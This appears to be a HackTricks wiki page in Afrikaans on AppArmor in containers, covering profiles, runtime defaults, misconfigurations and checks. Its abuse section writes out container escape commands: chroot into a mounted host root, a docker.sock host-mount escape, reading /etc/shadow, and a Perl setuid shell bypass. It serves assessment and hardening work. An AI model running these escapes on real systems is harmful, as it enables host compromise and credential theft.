# AppArmor

{{#include ../../../../banners/hacktricks-training.md}}

## Oorsig

AppArmor is 'n **Verpligte Toegangsbeheer**-stelsel wat beperkings oplê deur per-program profiele. Anders as tradisionele DAC-kontroles, wat swaar staatmaak op gebruiker- en groep‑eienaarskap, laat AppArmor die kernel 'n beleid afdwing wat aan die proses self gekoppel is. In houer‑omgewings maak dit saak omdat 'n werklas dalk genoeg tradisionele voorreg het om 'n aksie te probeer en steeds geweier kan word omdat sy AppArmor‑profiel nie die relevante pad, mount, netwerkgedrag of gebruik van capabilities toelaat nie.

Die belangrikste konseptuele punt is dat AppArmor **padgebaseerd** is. Dit redeneer oor lêerstelseltoegang deur padreëls eerder as deur etikette soos SELinux doen. Dit maak dit toeganklik en kragtig, maar dit beteken ook dat bind mounts en alternatief paduitlegte noukeurige aandag verdien. As dieselfde host-inhoud onder 'n ander pad bereikbaar word, mag die effek van die beleid nie wees wat die operateur aanvanklik verwag het nie.

## Rol in houer-isolasie

Houer-sekuriteitsbeoordelings stop dikwels by capabilities en seccomp, maar AppArmor bly saak maak ná daardie kontroles. Stel jou 'n houer voor wat meer voorreg het as wat dit behoort te hê, of 'n werklas wat een ekstra capability vir operasionele redes nodig gehad het. AppArmor kan steeds lêertoegang, mount-gedrag, netwerking en uitvoeringspatrone beperk op maniere wat die voor die hand liggende misbruikspad stop. Daarom kan die deaktiveer van AppArmor "net om die toepassing aan die praat te kry" stilweg 'n bloot risikokonfigurasie in een wat aktief uitgebuit kan word, omskep.

## Lab

Om te kontroleer of AppArmor op die gasheer aktief is, gebruik:
```bash
aa-status 2>/dev/null || apparmor_status 2>/dev/null
cat /sys/module/apparmor/parameters/enabled 2>/dev/null
```
Om te sien onder watter gebruiker die huidige container-proses loop:
```bash
docker run --rm ubuntu:24.04 cat /proc/self/attr/current
docker run --rm --security-opt apparmor=unconfined ubuntu:24.04 cat /proc/self/attr/current
```
Die verskil is insiggewend. In die normale geval behoort die proses 'n AppArmor-konteks te wys wat gekoppel is aan die profiel wat deur die runtime gekies is. In die unconfined-geval verdwyn daardie ekstra beperkinglaag.

Jy kan ook inspekteer wat Docker dink dit toegepas het:
```bash
docker inspect <container> | jq '.[0].AppArmorProfile'
```
## Runtime Usage

Docker kan 'n standaard- of pasgemaakte AppArmor-profiel toepas wanneer die gasheer dit ondersteun. Podman kan ook met AppArmor integreer op AppArmor-gebaseerde stelsels, alhoewel op verspreidings wat SELinux voorrang gee die ander MAC-stelsel dikwels die hoofrol speel. Kubernetes kan AppArmor-beleid op die werkbelastingvlak blootstel op nodes wat wel AppArmor ondersteun. LXC en verwante stelsel-container-omgewings (Ubuntu-familie) gebruik AppArmor ook uitgebreid.

Die praktiese punt is dat AppArmor nie 'n "Docker feature" is nie. Dit is 'n gasheer-kern-funksie wat verskeie runtimes kan kies om toe te pas. As die gasheer dit nie ondersteun nie of die runtime is opdrag gegee om unconfined te loop, is die veronderstelde beskerming nie regtig daar nie.

Op Docker-ondersteunende AppArmor-gashere is die bekendste standaard `docker-default`. Daardie profiel word gegenereer vanaf Moby se AppArmor-templaat en is belangrik omdat dit verduidelik waarom sommige capability-based PoCs steeds in 'n standaard container misluk. In breë terme laat `docker-default` gewone netwerkverkeer toe, weier skryfaksies na baie van `/proc`, weier toegang tot sensitiewe dele van `/sys`, blokkeer mount-operasies, en beperk ptrace sodat dit nie 'n algemene gasheer-ondersoekprimitive is nie. Om daardie basislyn te verstaan help om te onderskei tussen "die container het `CAP_SYS_ADMIN`" en "die container kan daardie capability effektief teen die kernel-koppelvlakke wat my interesseer gebruik".

## Profile Management

AppArmor-profiele word gewoonlik gestoor onder `/etc/apparmor.d/`. 'n Algemene naamgewingkonvensie is om skuinsstrepe in die uitvoerbare pad met kolletjies te vervang. Byvoorbeeld, 'n profiel vir `/usr/bin/man` word algemeen gestoor as `/etc/apparmor.d/usr.bin.man`. Hierdie detail is belangrik tydens beide verdediging en assessering omdat sodra jy die aktiewe profielnaam ken, jy dikwels die ooreenstemmende lêer vinnig op die gasheer kan opspoor.

Nuttige gasheer-kant bestuurskommando's sluit in:
```bash
aa-status
aa-enforce
aa-complain
apparmor_parser
aa-genprof
aa-logprof
aa-mergeprof
```
Die rede waarom hierdie opdragte saak maak in 'n container-security verwysing, is dat hulle verduidelik hoe profiele eintlik gebou, gelaai, na complain mode geskuif en gewysig word nadat toepassings verander is. As 'n operateur die gewoonte het om profiele tydens foutoplossing na complain mode te skuif en vergeet om enforcement te herstel, mag die container in dokumentasie beskerm lyk terwyl dit in werklikheid baie losser optree.

### Bou en bywerk van profiele

`aa-genprof` kan toepassingsgedrag observeer en help om 'n profiel interaktief te genereer:
```bash
sudo aa-genprof /path/to/binary
/path/to/binary
```
`aa-easyprof` kan 'n sjabloonprofiel genereer wat later met `apparmor_parser` gelaai kan word:
```bash
sudo aa-easyprof /path/to/binary
sudo apparmor_parser -a /etc/apparmor.d/path.to.binary
```
Wanneer die binêre verander en die beleid bygewerk moet word, kan `aa-logprof` die weierings wat in logs gevind is herhaal en die operateur help besluit of dit toegelaat of geweier moet word:
```bash
sudo aa-logprof
```
### Logboeke

AppArmor-weierings is dikwels sigbaar deur `auditd`, syslog, of gereedskap soos `aa-notify`:
```bash
sudo aa-notify -s 1 -v
```
Dit is operasioneel en offensief nuttig. Verdedigers gebruik dit om profile te verfyn. Aanvallers gebruik dit om te leer watter presiese path of operation geweier word en of AppArmor die control is wat 'n exploit chain blokkeer.

### Identifisering van die presiese profile-lêer

Wanneer 'n runtime 'n spesifieke AppArmor profile-naam vir 'n container wys, is dit dikwels nuttig om daardie naam terug te karteer na die profile-lêer op die skyf:
```bash
docker inspect <container> | grep AppArmorProfile
find /etc/apparmor.d/ -maxdepth 1 -name '*<profile-name>*' 2>/dev/null
```
Dit is veral nuttig tydens host-side hersiening omdat dit die gaping oorbrug tussen "die container sê dit hardloop onder profiel `lowpriv`" en "die werklike reëls woon in hierdie spesifieke lêer wat nagegaan of herlaai kan word".

## Konfigurasiefoute

Die mees voor die hand liggende fout is `apparmor=unconfined`. Administrateurs stel dit dikwels terwyl hulle 'n toepassing debug wat misluk het omdat die profiel iets gevaarliks of onverwagts korrek geblokkeer het. As die vlag in produksie bly, is die hele MAC-laag effektief verwyder.

Nog 'n subtiele probleem is om aan te neem dat bind mounts onskadelik is omdat die lêertoestemmings normaal lyk. Aangesien AppArmor padgegrond is, kan die blootstelling van host paths onder alternatiewe mount-ligginge sleg met padreëls interakteer. 'n Derde fout is om te vergeet dat 'n profielnaam in 'n konfigurasielêer baie min beteken as die host kernel nie eintlik AppArmor afdwing nie.

## Misbruik

Wanneer AppArmor weg is, kan operasies wat voorheen beperk was skielik werk: reading sensitive paths through bind mounts, toegang tot dele van procfs of sysfs wat moeiliker moes bly om te gebruik, uitvoering van mount-verwante aksies as capabilities/seccomp dit ook toelaat, of die gebruik van paaie wat 'n profiel normaalweg sou weier. AppArmor is dikwels die meganisme wat verduidelik waarom 'n capability-based breakout attempt "should work" op papier maar steeds in die praktyk misluk. Verwyder AppArmor, en dieselfde poging mag begin slaag.

As jy vermoed AppArmor is die hoofding wat 'n path-traversal, bind-mount, of mount-based abuse chain stop, is die eerste stap gewoonlik om te vergelyk wat met en sonder 'n profiel toeganklik raak. Byvoorbeeld, as 'n host path binne die container gemount is, begin deur te kontroleer of jy dit kan deursoek en lees:
```bash
cat /proc/self/attr/current
find /host -maxdepth 2 -ls 2>/dev/null | head
find /host/etc -maxdepth 1 -type f 2>/dev/null | head
```
As die container ook 'n gevaarlike bevoegdheid soos `CAP_SYS_ADMIN` het, is een van die mees praktiese toetse om te sien of AppArmor die beheer is wat mount-operasies of toegang tot sensitiewe kernel-lêerstelsels blokkeer:
```bash
capsh --print | grep cap_sys_admin
mount | head
mkdir -p /tmp/testmnt
mount -t proc proc /tmp/testmnt 2>/dev/null || echo "mount blocked"
mount -t tmpfs tmpfs /tmp/testmnt 2>/dev/null || echo "tmpfs blocked"
```
In omgewings waar 'n host path reeds beskikbaar is deur 'n bind mount, kan die verlies van AppArmor ook 'n read-only information-disclosure-kwessie omskep in direkte toegang tot host-lêers:
```bash
ls -la /host/root 2>/dev/null
cat /host/etc/shadow 2>/dev/null | head
find /host/var/run -maxdepth 2 -name '*.sock' 2>/dev/null
```
Die punt van hierdie kommando's is nie dat AppArmor alleen die uitbraak veroorsaak nie. Dit is dat sodra AppArmor verwyder is, baie lêerstelsel- en mount-gebaseerde misbruikpaaie onmiddellik toetsbaar raak.

### Volledige Voorbeeld: AppArmor Gedeaktiveer + Host Root Gemount

As die container reeds die host root by `/host` bind-mounted het, kan die verwydering van AppArmor 'n geblokkeerde lêerstelsel- en mount-gebaseerde misbruikpad in 'n volledige host-ontsnapping omskep:
```bash
cat /proc/self/attr/current
ls -la /host
chroot /host /bin/bash 2>/dev/null || /host/bin/bash -p
```
Sodra die shell deur die host-lêerstelsel uitgevoer word, het die werklas effektief die houergrens ontsnap:
```bash
id
hostname
cat /etc/shadow | head
```
### Volledige Voorbeeld: AppArmor Uitgeskakel + Runtime Socket

As die werklike versperring AppArmor rondom die runtime-toestand was, kan 'n gemounte socket genoeg wees vir 'n volledige ontsnapping:
```bash
find /host/run /host/var/run -maxdepth 2 -name docker.sock 2>/dev/null
docker -H unix:///host/var/run/docker.sock run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
```
Die presiese pad hang af van die mount point, maar die eindresultaat is dieselfde: AppArmor verhoed nie meer toegang tot die runtime API nie, en die runtime API kan 'n host-kompromitteerende container lanseer.

### Volledige voorbeeld: Path-Based Bind-Mount Bypass

Omdat AppArmor pad-gebaseerd is, beskerming van `/proc/**` beskerm nie outomaties dieselfde host procfs-inhoud wanneer dit deur 'n ander pad bereikbaar is nie:
```bash
mount | grep '/host/proc'
find /host/proc/sys -maxdepth 3 -type f 2>/dev/null | head -n 20
cat /host/proc/sys/kernel/core_pattern 2>/dev/null
```
Die impak hang af van wat presies gemonteer is en of die alternatiewe pad ook ander kontroles omseil; hierdie patroon is een van die duidelikste redes waarom AppArmor saam met die mount-opstelling en nie geïsoleerd beoordeel moet word nie.

### Volledige voorbeeld: Shebang Bypass

AppArmor-beleid mik soms op 'n interpreter-pad op 'n wyse wat nie ten volle rekening hou met skrip-uitvoering via shebang-hantering nie. 'n Historiese voorbeeld het 'n skrip betrek waarvan die eerste reël na 'n gekonfineerde interpreter wys:
```bash
cat <<'EOF' > /tmp/test.pl
#!/usr/bin/perl
use POSIX qw(setuid);
POSIX::setuid(0);
exec "/bin/sh";
EOF
chmod +x /tmp/test.pl
/tmp/test.pl
```
Hierdie soort voorbeeld is belangrik as 'n herinnering dat profile se bedoeling en die werklike uitvoeringssemantiek kan uiteenloop. Wanneer jy AppArmor in container-omgewings hersien, verdien interpreterkettings en alternatiewe uitvoeringspaaie spesiale aandag.

## Kontroles

Die doel van hierdie kontroles is om drie vrae vinnig te beantwoord: is AppArmor op die host aangeskakel, is die huidige proses beperk, en het die runtime werklik 'n profile op hierdie container toegepas?
```bash
cat /proc/self/attr/current                         # Current AppArmor label for this process
aa-status 2>/dev/null                              # Host-wide AppArmor status and loaded/enforced profiles
docker inspect <container> | jq '.[0].AppArmorProfile'   # Profile the runtime says it applied
find /etc/apparmor.d -maxdepth 1 -type f 2>/dev/null | head -n 50   # Host-side profile inventory when visible
```
Wat hier interessant is:

- If `/proc/self/attr/current` shows `unconfined`, the workload is not benefiting from AppArmor confinement.
- If `aa-status` shows AppArmor disabled or not loaded, any profile name in the runtime config is mostly cosmetic.
- If `docker inspect` shows `unconfined` or an unexpected custom profile, that is often the reason a filesystem or mount-based abuse path works.

As 'n container reeds verhoogde voorregte het vir operasionele redes, maak dit om AppArmor aangeskakel te laat dikwels die verskil tussen 'n beheerde uitsondering en 'n veel wyer sekuriteitsfout.

## Standaardinstellings vir runtime

| Runtime / platform | Default state | Default behavior | Common manual weakening |
| --- | --- | --- | --- |
| Docker Engine | Enabled by default on AppArmor-capable hosts | Uses the `docker-default` AppArmor profile unless overridden | `--security-opt apparmor=unconfined`, `--security-opt apparmor=<profile>`, `--privileged` |
| Podman | Host-dependent | AppArmor is supported through `--security-opt`, but the exact default is host/runtime dependent and less universal than Docker's documented `docker-default` profile | `--security-opt apparmor=unconfined`, `--security-opt apparmor=<profile>`, `--privileged` |
| Kubernetes | Conditional default | If `appArmorProfile.type` is not specified, the default is `RuntimeDefault`, but it is only applied when AppArmor is enabled on the node | `securityContext.appArmorProfile.type: Unconfined`, `securityContext.appArmorProfile.type: Localhost` with a weak profile, nodes without AppArmor support |
| containerd / CRI-O under Kubernetes | Follows node/runtime support | Common Kubernetes-supported runtimes support AppArmor, but actual enforcement still depends on node support and workload settings | Same as Kubernetes row; direct runtime configuration can also skip AppArmor entirely |

Vir AppArmor is die belangrikste veranderlike dikwels die **host**, nie net die runtime nie. 'n Profielinstelling in 'n manifest skep nie konfinering op 'n node waar AppArmor nie aangeskakel is nie.
